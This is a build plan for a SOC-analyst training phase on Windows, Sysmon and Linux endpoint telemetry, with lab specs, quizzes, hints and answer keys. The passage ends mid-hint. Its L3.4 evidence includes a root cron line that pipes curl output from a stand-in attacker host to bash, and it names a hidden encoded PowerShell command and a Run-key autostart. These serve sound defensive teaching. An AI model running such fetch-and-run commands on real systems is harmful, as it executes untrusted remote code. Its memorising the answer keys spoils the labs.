# SOC Track — Phase 3 Build Plan (v1)

**Mode:** plan only — produced 2026-07-19 per Phase Builder step 3 (PROMPTS.md Prompt 2),
inside a PLAN-AHEAD session that plans every remaining soc phase one at a time.
**This document is the deliverable for `docs/plans/soc-p3-plan.md`** (saved there verbatim on go-ahead).
**Binding content spec:** `docs/curriculum/soc-analyst-lab-curriculum-v1.md` — Phase 3 (§6, lines 167–180).
**Binding mechanical spec:** `docs/kit-contracts.md` + the soc quality gates in `PROMPTS.md`.
**Predecessor plans (inherited conventions):** `docs/plans/soc-p01-plan.md` (§1 universe, §2 generator,
§2.1 grading pattern, §2.2 id registry) and `docs/plans/soc-p2-plan.md` (network plane, defanged-IOC
regex-escape recipe, SO-overlay policy). These are **not** re-derived here; this plan extends them.
**Scope:** 7 labs — L3.1–L3.7 (gate L3.7) — plus the `tools/genevidence/` emitter extensions
(Windows scheduled-task/service events, Linux auditd/useradd/sudo, Sysmon-registry, ProcessGuid tree)
that Phase 3 endpoint evidence needs.

## 0. Ground rules this plan follows

Identical to the predecessor plans, restated so this file stands alone:

- Lab list is **map-exact**: ids, titles, types, gate placement — no deviations proposed (§167–180).
- Evidence is **generated, never hand-written**: each scenario is a `scenario.yaml`; the generator emits
  BOTH evidence files AND answer key from one source, so keys can never drift.
- Every lab grades **offline inside the check fence** (`env -i`, no network, stdin `/dev/null`, 120s, no
  absolute paths, checklib helpers + `ck_summary` last).
- Raw evidence (Windows Security JSON, Sysmon JSON, `auth.log`) is **never defanged**; prose, answer
  keys, and required learner IOC submissions **do** defang (final-dot-bracket domains, bracketed IPs,
  `hxxp://`) — graded with the soc-p2 §2 regex-escape recipe.
- **Flat-file first:** every lab grades against `files/` (→ workspace), no VM. Per the map's SO policy
  (§60–62) and soc-p2 D4, the **Security Onion overlay is an ungraded appendix** on the two bundle labs
  (L3.5 optional, L3.7) — flat-file is always the graded path.
- ADHD contract: one concept per lab, est 10–20 min, zero prerequisite reading.

## 1. Universe additions — the endpoint plane

Phase 3 is the endpoint counterpart of Phase 2's network plane. Everything below is additive to
`soc-p01-plan.md` §1; no entity is redefined. Single source stays `tools/genevidence/universe.yaml`.

- **Windows Security channel (ECS/winlogbeat-shaped JSON, per host).** The core event codes the phase
  teaches, all already present in the universe motifs: `4624` logon success (with `winlog.logon.type`),
  `4625` logon failure, `4688` process creation (`process.name`, `process.parent.name`,
  `process.command_line`, `winlog.event_data.TokenElevationType`), `4720` account created, `4732`
  member added to a security-enabled local group, `4672` special privileges assigned, `4698` scheduled
  task created, `4697`/`7045` service installed. Logon-type vocabulary taught in L3.1: **2** interactive,
  **3** network, **5** service, **10** remote-interactive (RDP), **11** cached.
- **Sysmon channel (ECS JSON, per host).** Event codes: **1** process creation (adds `process.entity_id`
  = **ProcessGuid** and `process.parent.entity_id` = **ParentProcessGuid** — the endpoint join key,
  analog of Zeek `uid`), **3** network connection, **11** file create, **13** registry value set (Run
  keys). ProcessGuids are **deterministic**, seeded per scenario (fixed list, no `uuid`/`random` at
  emit), so re-runs are byte-identical.
- **Linux endpoint (`/var/log/auth.log` syslog + auditd).** sshd `Failed password`/`Accepted
  publickey|password`/`invalid user`, `sudo` COMMAND lines, `useradd`/`new user` lines, PAM
  `session opened`. WEB01 `10.20.10.20` (Ubuntu 22.04) is the Linux host; auditd `execve`/`USER_ACCT`
  records are the audit half.
- **Reused endpoint canon (no new values invented)** — Phase 3 is where the motifs' endpoint evidence
  is read in depth:
  - **M1 spray:** 4625 bursts + the 4624 type-3 success `CM-0311-0142` (m.reyes, DC01, 14:22:31Z).
  - **M2 macro→exec→persist:** Sysmon-1 `WINWORD.EXE → powershell.exe -nop -w hidden -enc …`
    (`CM-0311-0201`, WKS-ACCT-07), Sysmon-3 beacon to 203.0.113.66:443 (`CM-0311-0179`), Sysmon-13 Run
    key `HKCU\...\Run\OneDriveUpd` (`CM-0311-0181`).
  - **Lateral / rogue admin:** CHG-2143 PsExec 4624 type 3 t.aoki→DC01 (`CM-0310-0019`); the rogue
    `PSEXESVC` + `4720`/`4732` account creation (`CM-0311-0244`/`0245` on FS01, from L1.8).
  - **Linux persistence:** WEB01 root-SSH from 203.0.113.66 + `crontab REPLACE` + CRON PAM session
    (`CM-0312-0455`/`0457`/`0460`, from L1.8 CM-A-55) running `curl hxxp://cdn.stonewick.example/u.sh
    | bash` every 10 min.
- **Cross-plane continuity (stated, not re-emitted):** the Sysmon-3 beacon `CM-0311-0179` is the same
  connection Phase 2 saw as Zeek conn/ssl `CM-0311-0501`/`0502`. Endpoint and network sensors, one
  beacon — the payoff the L3.7 gate leans on.

## 2. Generator extensions — `tools/genevidence/`

Prerequisite: `soc-p0`/`soc-p1`/`soc-p2` tagged (generator core + Phase 2 emitters exist). Phase 3 adds
four emitters + one verify invariant, all authoring-time only:

1. **`win_secevent`** — Windows Security ECS JSON with the codes above (4624/4625/4688/4720/4732/4672/
   4698/4697/7045), `winlog.logon.type`, `winlog.event_data.*` (TargetUserName, SubjectUserName,
   LogonType, ServiceName, TaskName, MemberSid), and the `CM-` `event.id`. (Extends the p0/p1 ecs-json
   emitter with the new codes/fields — not a new format.)
2. **`sysmon_tree`** — Sysmon-1 rows with deterministic **ProcessGuid/ParentProcessGuid** so a tree
   reconstructs; plus Sysmon 3/11/13 rows sharing the parent ProcessGuid.
3. **`linux_authlog`** — `auth.log` syslog lines (sshd, sudo, useradd, PAM) + optional auditd
   `execve`/`USER_ACCT` records, RFC3339 UTC timestamps.
4. **`win_persistence`** — the 4698 (scheduled task) / 4697|7045 (service) / Sysmon-13 (Run key) rows
   as a coherent persistence set.
5. **`verify.py` addition — ProcessGuid consistency:** every `ParentProcessGuid` in a Sysmon bundle
   resolves to a real `ProcessGuid` in the same bundle (the endpoint analog of Phase 2's uid-consistency
   gate), and every answer-key ProcessGuid/event id exists in the emitted evidence.

Grading conventions inherited verbatim: **§2.1 canonical pattern** (presence → normalize-once to
`.answers.norm` → one anchored `assert_file_contains` per question, keys from the generated base64
block → `ck_summary` last), **`harness_err` only for a corrupt key block**, and the **soc-p2 §2
regex-escape one-liner** for any defanged-IOC key (`203.0.113[.]66`, `cdn.stonewick[.]example`).

## 2.1 Canonical id additions (binding — extends `soc-p01-plan.md` §2.2 and `soc-p2-plan.md` §2.1)

New Phase 3 endpoint events are allocated in the **`CM-<MMDD>-06xx` band** (Phase 1 used 0002–0245 /
0301–0460; Phase 2 network used 05xx; the 06xx band is unused). Rule ids stay `CM-R-<nnnn>`. Reused
canon (same event, endpoint plane) is cited, not re-minted: `CM-0311-0142`, `CM-0311-0201`,
`CM-0311-0179`, `CM-0311-0181`, `CM-0310-0019`, `CM-0311-0244`/`0245`, `CM-0312-0455`/`0457`/`0460`.

New canon pinned by this phase (reused across L3.2/L3.3/L3.4/L3.7 so the tree is one tree):

| Canonical id | Event |
|---|---|
| `CM-0311-0610` | Sysmon 1: `explorer.exe → WINWORD.EXE` on WKS-ACCT-07 (the benign parent of the macro doc), `2026-03-11T15:40:50Z` — the tree's root above `CM-0311-0201` |
| `CM-0311-0611` | Sysmon 1: `powershell.exe → cmd.exe → whoami.exe /all` child chain off `CM-0311-0201` (post-exploitation recon) |
| `CM-0311-0244`/`0245` | 4720 create `supportadmin` + 4732 add-to-Administrators on FS01 (reused from L1.8) |
| `CM-0311-0620` | 4698 scheduled task `\Microsoft\Windows\UpdateOrchestrator\OneDriveSync` created on WKS-ACCT-07 (attacker task) |
| `CM-0312-0630` | Linux: `useradd` of `websvc` on WEB01 during the root-SSH session (`2026-03-12T20:17:00Z`) |

ProcessGuid seeds (deterministic, pinned): `{PG-WINWORD, PG-PS1, PG-CMD1, PG-WHOAMI}` chain for the M2
tree; a build-time entry appended to `tools/genevidence/universe-events.yaml` encodes both this id
table and the ProcessGuid seeds so p4+ import them instead of re-minting.

## 3. Decisions & flagged deviations (approve/veto with the plan)

1. **ProcessGuid rendered as a short stable token, not a raw GUID.** Real Sysmon ProcessGuids are
   `{XXXXXXXX-...}` GUIDs. Decision: emit readable deterministic tokens (`PG-PS1`) in a
   `process.entity_id` field, with a one-line note that production Sysmon uses full GUIDs and the join
   logic is identical. Keeps L3.2/L3.3 answers typable without a 36-char copy. Veto to use full GUIDs.
2. **Windows event JSON stays ECS/winlogbeat-shaped** (as L1.1/L1.3 established), not raw EVTX XML — the
   learner reads `event.code`/`winlog.event_data.*` with `jq`, consistent with every prior Windows lab.
3. **L3.6 (LOLBins) explicitly closes the Bash-track loop** (map job hook): the WEB01
   `curl hxxp://cdn.stonewick.example/u.sh | bash` the learner *audited* in Bash P4 is shown here as
   *victim telemetry* (auth.log + auditd execve). Same attack, both sides of the glass — reuses existing
   universe facts, invents no new attacker capability. lab.md names the cross-track link in the recap.
4. **Security Onion overlay = ungraded appendix on L3.7 (and optionally L3.5) only.** Endpoint labs are
   mostly flat-file JSON; the bundle labs are where a Hunt-UI rep adds value. No check.sh references the
   VM. Veto to drop or promote.
5. **Defanged IOCs are valid graded answers in HUNT labs** (L3.3/L3.5/L3.7): the C2 IP, the payload URL,
   the SSH brute-force source are keyed and submitted **defanged**, graded with the §2 regex-escape
   recipe. Grammar comments in every template state the requirement.
6. **auth.log timestamps rendered ISO-8601 UTC** (consistent with soc-p2 D1's zeek decision and L1.2's
   UTC discipline), with a one-line note that classic syslog omits year/offset — the lesson L1.2 owns.

## 3.5 Self-review corrections applied

- **The tree must actually resolve.** L3.2/L3.3 collapse if a `ParentProcessGuid` points at nothing.
  Fixed: `sysmon_tree` shares one ProcessGuid per logical process and `verify.py`'s new ProcessGuid
  invariant is a hard pre-commit gate; the M2 tree root is `CM-0311-0610` (`explorer.exe→WINWORD.EXE`)
  so `CM-0311-0201`'s parent is present, not dangling.
- **"Anomalous" needs a benign control in the same log.** L3.3 only teaches if benign parentage
  (`explorer.exe→WINWORD.EXE`, `cmd.exe→whoami.exe`, `services.exe→svchost.exe`) sits beside the
  anomalous pair (`WINWORD.EXE→powershell.exe`). Fixed: `s3-wrong-child` emits both; the hunt is
  *which* ancestry is wrong, not "find the one process."
- **Brute-force discriminator needs a benign SSH success.** L3.5 keys a *successful* login after
  failures; without a benign publickey login in the same file the learner can't distinguish "spray then
  success" from "normal admin login." Fixed: `s3-linux-auth` emits d.okafor's benign publickey login and
  t.aoki's benign session alongside the root brute-force + `websvc` useradd.
- **LOLBin classification needs benign uses of the same binaries.** L3.6 is meaningless if every
  `certutil`/`powershell` line is malicious. Fixed: `s3-lolbins` pairs each abused binary with a benign
  invocation (a signed admin `powershell.exe -File C:\Scripts\...ps1`, a legitimate `certutil -verify`),
  so the answer is *abuse vs benign*, not *spot the tool*.
- **4732 SID vs name.** 4732 events carry a `MemberSid`, not a username; an early draft keyed a
  username. Fixed: L3.1/L3.4 key the **event.code** and the paired **4720 TargetUserName**, and treat
  the 4720→4732 pair as the "account created then elevated" story rather than reading a name off 4732.

---

## 4. Phase 3 — labs

### L3.1 — Windows events that matter — 4624/4625 and logon types, 4688 process creation, 4720 new account

| id | title | type | gate | est_minutes |
|---|---|---|---|---|
| L3.1 | Windows events that matter — 4624/4625 and logon types, 4688 process creation, 4720 new account | DECODE | false | 15 |

Dir `tracks/soc/phases/p3/L3.1-windows-events/`. **One concept:** the small set of Windows Security
event codes an analyst knows cold, and what `winlog.logon.type` means. Reading, not hunting.

**TEACHING ARTIFACT**
- **Files staged** (`files/`; generated `s3-windows-events`, RAW):
  - `security.json` — winlogbeat-shaped ECS JSON lines from DC01/FS01/WKS-ACCT-07, 12 rows over
    `2026-03-10 … 03-11`, fields `event.id, @timestamp, event.code, host.name, user.name,
    winlog.logon.type, source.ip, winlog.event_data.{TargetUserName,SubjectUserName,LogonType,
    MemberSid}, event.outcome`. Contents:
    - 4625 spray failures m.reyes/d.okafor from 203.0.113.66 (canon range) — logon type 3.
    - **4624 type 3 success** m.reyes, DC01, from 203.0.113.66, 14:22:31Z (`CM-0311-0142`) — the M1 win.
    - 4624 **type 2** interactive m.reyes on WKS-ACCT-07 (benign morning logon).
    - 4624 **type 10** RDP t.aoki→DC01 under a change window (benign admin).
    - 4624 type 3 t.aoki→DC01 PsExec CHG-2143 (`CM-0310-0019`).
    - **4688** process creation `powershell.exe` parent `WINWORD.EXE` on WKS-ACCT-07 (paired with M2).
    - **4720** account created `supportadmin` on FS01 (`CM-0311-0244`) + **4732** add-to-Administrators
      (`CM-0311-0245`, carries `MemberSid`, no username — the §3.5 fix).
    - 4672 special privileges for the new admin logon.
  - `event-code-legend.md` — static cheat-sheet: the codes + logon-type table (2/3/5/10/11).
  - `answers.template.txt`.
- **Learner task:** `jq` the log, answer. Template + grammar:
  ```
  q1=   # event.code for a SUCCESSFUL logon                                   -> 4624
  q2=   # event.code for a FAILED logon                                        -> 4625
  q3=   # logon type meaning "network" (integer)                               -> 3
  q4=   # event.code that means "a new user account was created"               -> 4720
  q5=   # event.code for process creation in the Windows Security log          -> 4688
  q6=   # event.id of the ONE successful network logon from the C2 IP          -> cm-0311-0142
  ```
- **Grading** (`check.sh`, §2.1): presence + normalize; six anchored checks from decoded keys;
  `ck_summary` last. (No defanged IOCs here — all tokens/codes/ids.)
- **Kit files:**
  - `meta.json`: `{id:"L3.1", type:"DECODE", objective:"Recognize the core Windows Security event codes
    (4624/4625/4688/4720/4732) and read winlog.logon.type", gate:false, est_minutes:15}`
  - `quiz.json`:
    1. (choice) "A 4624 with `logon.type 3` is:" a) an interactive desktop logon b) a network logon
       (SMB, auth to a service over the network) c) an RDP session d) a failed logon → **b**
    2. (choice) "You see 4720 immediately followed by 4732 on the same host. The story is:" a) a logon
       failure b) a new account was created and then added to a group — watch which group c) a service
       started d) a process spawned → **b**
    3. (choice) "Why memorize these codes instead of looking them up each time?" a) they change often
       b) they're the analyst's multiplication tables — fast recognition is the whole job at Tier 1 c)
       lookups are banned d) they're secret → **b**
  - `hints.json`: L1 "The legend file lists every code and logon type; each answer is one code or one
    integer. `jq -r '.event.code' security.json | sort | uniq -c` shows what's present." L2 "4624
    success / 4625 failure; logon type 3 is network. New account is 4720; process creation in the
    Security log is 4688. For q6, filter 4624 with source.ip = the C2 address." L3 "q1 4624; q2 4625; q3
    3; q4 4720; q5 4688; q6 the 4624 type-3 from 203.0.113.66 is cm-0311-0142."
  - `recap.md` (3 lines): `A handful of Windows Security codes carry most of triage: 4624 logon success,
    4625 failure, 4688 process creation, 4720 account created, 4732 group add.` / `winlog.logon.type is
    the qualifier — 2 interactive, 3 network, 5 service, 10 RDP — and type 3 from an external IP is how
    a spray success looks.` / `4720 then 4732 is the account-created-then-elevated story; read the
    group, not just the name.`
  - **`recall.json`** (phase opener; 5, non-gating; **[VERIFY-AT-BUILD]** — Phase 2 is unbuilt, so
    sourced from the curriculum map's Phase 2 lab list (§150–162); matches the parked L3.1 draft in
    `soc-p2-plan.md` L2.7; re-verify against built P2 content):
    1. (choice) "In a zeek `conn.log` row, `conn_state SF` means?" a) no reply seen b) normal
       establishment and teardown c) rejected → **key b** — source **L2.1**.
    2. (text) "A host firing hundreds of long random subdomains under one zone with heavy NXDOMAIN is
       doing what? (one word)" → **key `tunneling`** (accept `tunnel`, `exfiltration`) — source **L2.2**.
    3. (text) "Regular ~300s callbacks with small jitter to one external IP are called ___ (one word)."
       → **key `beaconing`** (accept `beacon`) — source **L2.6**.
    4. (text) "HTTPS hides the URI; which TLS field still reveals the destination hostname? (one word)"
       → **key `sni`** (accept `server_name`) — source **L2.3**.
    5. (text) "Which zeek field joins one connection across conn.log, dns.log, http.log, and ssl.log?"
       → **key `uid`** — source **L2.5**.

**EVIDENCE SPEC**
```yaml
scenario: s3-windows-events          # tools/genevidence/s3-windows-events.yaml
lab: L3.1
window: {start: 2026-03-10T09:00:00Z, end: 2026-03-11T15:00:00Z}
hosts: {DC01: 10.20.10.5, FS01: 10.20.10.8, WKS-ACCT-07: 10.20.30.107}
actors: [m.reyes, d.okafor, t.aoki, supportadmin]
externals: {c2: 203.0.113.66}
benign_background:
  - {code: 4624, type: 2, user: m.reyes, host: WKS-ACCT-07, desc: morning interactive logon}
  - {code: 4624, type: 10, user: t.aoki, host: DC01, desc: RDP admin, change window}
  - {code: 4624, type: 3, user: t.aoki, host: DC01, id: CM-0310-0019, desc: CHG-2143 PsExec}
attacker_actions:
  - {code: 4625, type: 3, users: [m.reyes, d.okafor], src: 203.0.113.66, desc: spray failures}
  - {code: 4624, type: 3, user: m.reyes, host: DC01, src: 203.0.113.66, t: 2026-03-11T14:22:31Z, id: CM-0311-0142}
  - {code: 4688, proc: powershell.exe, parent: WINWORD.EXE, host: WKS-ACCT-07, desc: M2 exec}
  - {code: 4720, target: supportadmin, host: FS01, id: CM-0311-0244}
  - {code: 4732, group: Administrators, member_sid: <supportadmin SID>, host: FS01, id: CM-0311-0245}
emit: {security_json: files/security.json, legend: files/event-code-legend.md, answers_template: files/answers.template.txt}
answer_key: {q1: "4624", q2: "4625", q3: "3", q4: "4720", q5: "4688", q6: cm-0311-0142}
verify: [all ids present; the one 4624/type3 from 203.0.113.66 is CM-0311-0142; 4732 carries MemberSid not a name]
```

---

### L3.2 — Sysmon — process trees, parent-child relationships, command lines

| id | title | type | gate | est_minutes |
|---|---|---|---|---|
| L3.2 | Sysmon — process trees, parent-child relationships, command lines | DECODE | false | 15 |

Dir `tracks/soc/phases/p3/L3.2-sysmon-trees/`. **One concept:** ProcessGuid/ParentProcessGuid stitch a
process tree — the endpoint join key (analog of Zeek `uid`). Reconstruct the M2 tree, read command
lines.

**TEACHING ARTIFACT**
- **Files staged** (`files/`; generated `s3-sysmon-trees`, RAW; ProcessGuid-consistent):
  - `sysmon.json` — ECS Sysmon JSON lines, WKS-ACCT-07, 8 rows, fields `event.id, @timestamp,
    event.code("1"), process.entity_id(ProcessGuid), process.parent.entity_id(ParentProcessGuid),
    process.name, process.command_line, process.parent.name, user.name`. The M2 tree:
    - `explorer.exe (PG-EXPL) → WINWORD.EXE (PG-WINWORD)` `CM-0311-0610`, opening `invoice_2026-03.docm`.
    - `WINWORD.EXE (PG-WINWORD) → powershell.exe (PG-PS1)` `-nop -w hidden -enc …` `CM-0311-0201`.
    - `powershell.exe (PG-PS1) → cmd.exe (PG-CMD1)` `CM-0311-0611`.
    - `cmd.exe (PG-CMD1) → whoami.exe (PG-WHOAMI)` `whoami /all`.
    - benign siblings: `explorer.exe → OUTLOOK.EXE`, `services.exe → svchost.exe` (tree noise).
  - `sysmon-fields.md` — static: what each field is; the ProcessGuid join note (Sysmon uid).
  - `answers.template.txt`.
- **Learner task:** walk the tree by ProcessGuid; answer. Template + grammar:
  ```
  q1=   # ProcessGuid of powershell.exe launched by WINWORD.EXE                -> pg-ps1
  q2=   # process.name that is the PARENT of powershell.exe                     -> winword.exe
  q3=   # the child process powershell.exe spawned next                         -> cmd.exe
  q4=   # the full command line whoami.exe ran (lowercased)                     -> whoami /all
  q5=   # how many processes descend from WINWORD.EXE (its subtree, excl. itself)-> 3
  q6=   # event.id of the WINWORD->powershell spawn                             -> cm-0311-0201
  ```
- **Grading** (`check.sh`, §2.1): presence + normalize; six anchored checks; `ck_summary` last.
  `verify.py` ProcessGuid gate applies.
- **Kit files:**
  - `meta.json`: `{id:"L3.2", type:"DECODE", objective:"Reconstruct a Sysmon process tree via
    ProcessGuid/ParentProcessGuid and read command lines", gate:false, est_minutes:15}`
  - `quiz.json`:
    1. (choice) "What links a Sysmon child process to its parent?" a) the timestamp b)
       ParentProcessGuid = the parent's ProcessGuid c) the username d) the image path → **b**
    2. (choice) "Why is the command line the analyst's best field on a Sysmon 1 event?" a) it's short
       b) it shows exactly what was run, including flags like `-enc` that reveal intent c) it's always
       clean d) it's the process id → **b**
    3. (choice) "`explorer.exe → WINWORD.EXE → powershell.exe`. Which link is the suspicious one?" a)
       explorer→WINWORD (a user opened a doc) b) WINWORD→powershell (a document spawning a shell) c)
       both d) neither → **b**
  - `hints.json`: L1 "Each row has a ProcessGuid and a ParentProcessGuid; match a child's parent guid to
    another row's process guid to climb the tree." L2 "Find powershell.exe, note its ProcessGuid and its
    parent's; then find rows whose ParentProcessGuid equals powershell's ProcessGuid to see its
    children." L3 "q1 pg-ps1; q2 winword.exe; q3 cmd.exe; q4 whoami /all; q5 three (ps1, cmd1, whoami);
    q6 cm-0311-0201."
  - `recap.md` (3 lines): `Sysmon 1 events chain into a tree: ParentProcessGuid points at the parent's
    ProcessGuid, so you can walk ancestry precisely — the endpoint version of a zeek uid.` / `The
    command line is the payload: -enc, -w hidden, and the parent image together tell you intent faster
    than any hash.` / `A document (WINWORD.EXE) spawning an interpreter (powershell.exe) is the shape
    that matters — read the ancestry, not just the process.`
  - No `recall.json`.

**EVIDENCE SPEC**
```yaml
scenario: s3-sysmon-trees            # tools/genevidence/s3-sysmon-trees.yaml
lab: L3.2
window: {start: 2026-03-11T15:40:00Z, end: 2026-03-11T15:42:00Z}
hosts: {WKS-ACCT-07: 10.20.30.107}
actors: [m.reyes]
process_guids: {PG-EXPL: explorer.exe, PG-WINWORD: WINWORD.EXE, PG-PS1: powershell.exe, PG-CMD1: cmd.exe, PG-WHOAMI: whoami.exe}
tree:
  - {parent: PG-EXPL, child: PG-WINWORD, cmd: "WINWORD.EXE invoice_2026-03.docm", id: CM-0311-0610}
  - {parent: PG-WINWORD, child: PG-PS1, cmd: "powershell.exe -nop -w hidden -enc <b64>", id: CM-0311-0201}
  - {parent: PG-PS1, child: PG-CMD1, cmd: "cmd.exe /c whoami /all", id: CM-0311-0611}
  - {parent: PG-CMD1, child: PG-WHOAMI, cmd: "whoami /all", id: CM-0311-0612}
benign_siblings: [explorer.exe->OUTLOOK.EXE, services.exe->svchost.exe]
emit: {sysmon_json: files/sysmon.json, fields_card: files/sysmon-fields.md, answers_template: files/answers.template.txt}
answer_key: {q1: pg-ps1, q2: winword.exe, q3: cmd.exe, q4: "whoami /all", q5: "3", q6: cm-0311-0201}
verify: [every ParentProcessGuid resolves to a ProcessGuid in the bundle; WINWORD subtree size == 3]
```

---

### L3.3 — The wrong child — spotting anomalous process ancestry (Office spawning a shell)

| id | title | type | gate | est_minutes |
|---|---|---|---|---|
| L3.3 | The wrong child — spotting anomalous process ancestry (Office spawning a shell) | HUNT | false | 20 |

Dir `tracks/soc/phases/p3/L3.3-wrong-child/`. **One concept:** anomalous ancestry — the parent-child
pair that should never happen (Office/browser/mail spawning a shell or interpreter). Find it in noise.

**TEACHING ARTIFACT**
- **Files staged** (`files/`; generated `s3-wrong-child`, RAW):
  - `sysmon.json` — ~20 Sysmon 1 rows across WKS-ACCT-07 / WKS-HD-03 / WKS-ENG-12, mixing benign and
    anomalous ancestry:
    - **anomalous (the hunt targets):** `WINWORD.EXE → powershell.exe -enc` (`CM-0311-0201`, M2);
      `w3wp.exe → cmd.exe` on a server (webshell shape, decoy id in 06xx); `outlook.exe → mshta.exe`.
    - **benign controls:** `explorer.exe → WINWORD.EXE`, `cmd.exe → whoami.exe`,
      `services.exe → svchost.exe`, `powershell.exe → pwsh.exe` (admin), `explorer.exe → chrome.exe`.
  - `known-good-parents.md` — static: a short table of normal parents for common processes (what should
    spawn powershell/cmd/mshta), so "wrong" is definable, not vibes.
  - `answers.template.txt`.
- **Learner task:** hunt anomalous parent→child pairs; answer. Template + grammar:
  ```
  q1=   # process.name of the interpreter WINWORD.EXE spawned                   -> powershell.exe
  q2=   # ProcessGuid of that anomalous powershell.exe                          -> pg-ps1
  q3=   # the Office/mail process that spawned mshta.exe                         -> outlook.exe
  q4=   # count of anomalous Office-or-mail-spawns-interpreter/shell pairs       -> <generator int>
  q5=   # one word: what class of activity a document spawning a shell indicates -> execution
  q6=   # event.id of the WINWORD->powershell spawn                             -> cm-0311-0201
  ```
- **Grading** (`check.sh`, §2.1): presence + normalize; anchored checks; **q4 is the generator-emitted
  anomalous-pair count** (`verify.py` asserts it equals the emitted count); q5 accepts `execution`
  (decoded key); `ck_summary` last.
- **Kit files:**
  - `meta.json`: `{id:"L3.3", type:"HUNT", objective:"Find anomalous process ancestry (Office/mail
    spawning a shell or interpreter) among benign process trees", gate:false, est_minutes:20}`
  - `quiz.json`:
    1. (choice) "Why is `WINWORD.EXE → powershell.exe` suspicious but `explorer.exe → WINWORD.EXE` is
       not?" a) powershell is malware b) documents don't legitimately launch shells; the desktop
       launching an app is normal c) explorer is trusted d) WINWORD is old → **b**
    2. (choice) "`w3wp.exe → cmd.exe` on a web server suggests:" a) a scheduled task b) a possible
       webshell — the IIS worker process spawning a command shell c) normal patching d) a login → **b**
    3. (choice) "You hunt by ancestry, not process name, because:" a) names are unique b) the same
       binary (powershell) is benign under one parent and malicious under another — the relationship
       carries the signal c) ancestry is faster to type d) names are hidden → **b**
  - `hints.json`: L1 "List parent→child pairs (`jq -r '[.process.parent.name,.process.name]|@tsv'`); the
    known-good-parents card tells you which pairs are normal." L2 "Focus on interpreters and shells
    (powershell, cmd, mshta, wscript): who is their parent? A document or mail client as parent is the
    anomaly." L3 "q1 powershell.exe; q2 pg-ps1; q3 outlook.exe; q4 = count the Office/mail→interpreter
    pairs; q5 execution; q6 cm-0311-0201."
  - `recap.md` (3 lines): `The wrong child is an ancestry problem: a document, browser, or mail client
    spawning a shell or interpreter is the tell, not the child process by itself.` / `Define normal
    first — what should launch powershell, cmd, mshta — so "wrong" is a rule, not a hunch.` / `This is
    ATT&CK Execution: the same powershell.exe is benign under an admin parent and malicious under
    WINWORD.EXE.`
  - No `recall.json`.

**EVIDENCE SPEC**
```yaml
scenario: s3-wrong-child             # tools/genevidence/s3-wrong-child.yaml
lab: L3.3
window: {start: 2026-03-11T15:40:00Z, end: 2026-03-12T14:00:00Z}
hosts: {WKS-ACCT-07: 10.20.30.107, WKS-HD-03: 10.20.30.103, WKS-ENG-12: 10.20.31.112}
anomalous_pairs:
  - {parent: WINWORD.EXE, child: powershell.exe, guid: PG-PS1, id: CM-0311-0201}
  - {parent: outlook.exe, child: mshta.exe, id: CM-0311-0640}
  - {parent: w3wp.exe, child: cmd.exe, id: CM-0311-0641}
benign_pairs: [explorer.exe->WINWORD.EXE, cmd.exe->whoami.exe, services.exe->svchost.exe,
               powershell.exe->pwsh.exe, explorer.exe->chrome.exe]
emit: {sysmon_json: files/sysmon.json, known_good: files/known-good-parents.md, answers_template: files/answers.template.txt}
answer_key: {q1: powershell.exe, q2: pg-ps1, q3: outlook.exe, q4: "<anomalous_pair_count>", q5: execution, q6: cm-0311-0201}
verify: [q4 equals emitted anomalous-pair count; every anomalous parent is a document/mail/web process]
```

---

### L3.4 — Persistence spots — run keys, scheduled tasks, services, cron

| id | title | type | gate | est_minutes |
|---|---|---|---|---|
| L3.4 | Persistence spots — run keys, scheduled tasks, services, cron | DECODE | false | 15 |

Dir `tracks/soc/phases/p3/L3.4-persistence/`. **One concept:** the four everyday persistence homes and
the log artifact each leaves — Run key (Sysmon 13), scheduled task (4698), service (4697/7045), cron
(Linux auth.log/crontab). Read each, match artifact → mechanism.

**TEACHING ARTIFACT**
- **Files staged** (`files/`; generated `s3-persistence`, RAW):
  - `windows-persistence.json` — ECS JSON, 6 rows: Sysmon 13 Run-key set
    `HKCU\...\CurrentVersion\Run\OneDriveUpd = powershell -enc …` (`CM-0311-0181`, M2); 4698 scheduled
    task `\...\UpdateOrchestrator\OneDriveSync` (`CM-0311-0620`); 7045 service install `PSEXESVC`;
    a benign 4698 (legit GPO task) and a benign 7045 (Windows Update service) as controls.
  - `web01-cron.log` — `auth.log` excerpt: `crontab[..]: (root) REPLACE (root)` (`CM-0312-0457`) + the
    installed line shown in a paired `root-crontab.txt`: `*/10 * * * * curl -s
    hxxp://cdn.stonewick.example/u.sh | bash` (raw file NOT defanged → shows `http://`... wait: this is
    an evidence file, so it stays RAW/fanged, `http://cdn.stonewick.example/u.sh`).
  - `persistence-legend.md` — static: mechanism → artifact table (Run key/Sysmon13 or 4657; task/4698;
    service/4697/7045; cron/crontab).
  - `answers.template.txt`.
- **Learner task:** match each artifact to its mechanism + read the malicious values. Template + grammar:
  ```
  # mechanism vocab: runkey | scheduledtask | service | cron
  q1=   # mechanism of the HKCU\...\Run\OneDriveUpd artifact                     -> runkey
  q2=   # mechanism recorded by Windows event.code 4698                          -> scheduledtask
  q3=   # mechanism recorded by event.code 7045                                  -> service
  q4=   # mechanism of the */10 * * * * root entry on WEB01                       -> cron
  q5=   # the URL the cron job pulls and pipes to bash — DEFANGED                 -> hxxp://cdn.stonewick[.]example/u.sh
  q6=   # event.id of the malicious Run-key set                                   -> cm-0311-0181
  ```
- **Grading** (`check.sh`, §2.1): presence + normalize; anchored checks; **q5 defanged** (regex-escape
  covers `[`/`]`/`.`/`/`; the `hxxp://` prefix is literal); `ck_summary` last.
- **Kit files:**
  - `meta.json`: `{id:"L3.4", type:"DECODE", objective:"Identify the four common persistence mechanisms
    (run key, scheduled task, service, cron) by their log artifacts and read the malicious payloads",
    gate:false, est_minutes:15}`
  - `quiz.json`:
    1. (choice) "A value under `HKCU\...\CurrentVersion\Run` runs when:" a) never b) the user logs on —
       it's a classic autostart c) the system shuts down d) a service starts → **b**
    2. (choice) "Windows event 4698 records:" a) a logon b) a scheduled task creation c) a new user d)
       a network connection → **b**
    3. (choice) "A cron line `*/10 * * * * curl … | bash` is persistence because:" a) cron is malware b)
       it re-fetches and runs attacker code every 10 minutes, surviving reboots c) curl is banned d) it
       uses bash → **b**
  - `hints.json`: L1 "The legend maps each artifact to a mechanism; four rows are malicious, two are
    benign controls. Match the registry path, the 4698, the 7045, and the cron line." L2 "Run key =
    Sysmon 13 registry set under ...\Run; 4698 = scheduled task; 7045 = service; the WEB01 crontab line
    is cron. Your URL answer must be defanged (hxxp://, [.])." L3 "q1 runkey; q2 scheduledtask; q3
